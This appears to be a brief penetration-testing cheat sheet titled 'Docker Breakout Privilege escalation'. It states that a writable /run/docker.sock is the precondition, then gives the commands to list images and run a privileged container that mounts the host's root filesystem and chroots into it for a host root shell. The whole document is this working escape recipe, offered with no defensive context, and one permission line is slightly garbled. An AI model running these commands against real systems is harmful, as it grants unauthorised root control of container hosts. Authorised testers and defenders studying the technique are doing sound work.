Docker Breakout Privilege escalation
-------------------------------------
In order to run privilege escalation command > /run/docker.sock must have write permission

rwx w .   /run/docker.sock

Infiltrate the docker image with bash shell (cd6261dd9dda is image id)
#docker images
#docker run -it --privileged -v /:/mnt/ cd6261dd9dda chroot /mnt/ bash




